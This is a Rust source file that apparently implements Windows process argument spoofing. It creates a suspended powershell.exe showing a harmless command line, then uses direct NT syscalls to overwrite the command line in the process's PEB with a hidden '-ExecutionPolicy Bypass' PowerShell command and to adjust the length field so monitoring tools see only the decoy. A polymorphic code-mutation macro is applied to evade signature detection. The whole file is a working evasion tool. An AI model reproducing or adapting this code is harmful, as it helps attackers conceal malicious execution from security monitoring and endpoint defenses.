#![allow(non_snake_case)]
use std::mem::{size_of, zeroed};
use std::ptr::null_mut;
use rustpolymorphic::polymorph;

mod syscalls;
mod windows;

use windows::{
    CreateProcessW,
    PEB,
    PROCESS_BASIC_INFORMATION,
    PROCESS_INFORMATION,
    SECURITY_ATTRIBUTES,
    STARTUPINFOW,
    UNICODE_STRING,
    CREATE_NEW_CONSOLE,
    CREATE_SUSPENDED,
    DWORD,
    LPVOID,
    NTSTATUS,
    LPCWSTR,
    LPWSTR,
    PVOID,
};

#[polymorph(fn_len = 10, garbage = true)]
fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}

#[polymorph(fn_len = 10, garbage = true)]
fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

#[polymorph(fn_len = 10, garbage = true)]
fn main() {
    let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
    let malicious_command_wide = to_wide_chars(malicious_command);

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0); // Null terminate

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as DWORD;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as DWORD;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir = to_wide_chars("C:\\windows\\");
    current_dir.push(0);

    let success = unsafe {
        CreateProcessW(
            null_mut(),
            spoofed_command_wide.as_mut_ptr() as LPWSTR,
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir.as_ptr() as LPCWSTR,
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        println!("CreateProcessW failed");
        return;
    }

    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let mut status: NTSTATUS;
    unsafe {
        status = syscalls::NtQueryInformationProcess(
            pi.hProcess,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as LPVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );
    }

    if status != 0 {
        println!("NtQueryInformationProcess failed");
        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    unsafe {
        status = syscalls::NtReadVirtualMemory(
            pi.hProcess,
            pbi.PebBaseAddress as LPVOID,
            &mut peb as *mut _ as LPVOID,
            size_of::<PEB>(),
            &mut bytes_read
        );
    }

    if status != 0 || bytes_read != size_of::<PEB>() {
        println!("NtReadVirtualMemory for PEB failed");
        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    unsafe {
        status = syscalls::NtReadVirtualMemory(
            pi.hProcess,
            peb.ProcessParameters as LPVOID,
            &mut proc_params as *mut _ as LPVOID,
            size_of::<Params>(),
            &mut bytes_read
        );
    }

    if status != 0 || bytes_read != size_of::<Params>() {
        println!("NtReadVirtualMemory for ProcessParameters failed");
        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
        return;
    }

    let mut bytes_written: usize = 0;
    unsafe {
        status = syscalls::NtWriteVirtualMemory(
            pi.hProcess,
            proc_params.CommandLine.Buffer as PVOID,
            malicious_command_wide.as_ptr() as LPVOID,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        );
    }

    if status != 0 {
        println!("NtWriteVirtualMemory for command line failed");
        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        status = syscalls::NtWriteVirtualMemory(
            pi.hProcess,
            len_address as LPVOID,
            &cmd_line_len as *const _ as LPVOID,
            size_of::<u16>(),
            &mut bytes_written
        );
    }

    if status != 0 {
        println!("NtWriteVirtualMemory for command line length failed");
        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = syscalls::NtResumeThread(pi.hThread, &mut suspend_count);
        let _ = syscalls::NtClose(pi.hProcess);
        let _ = syscalls::NtClose(pi.hThread);
    }
}
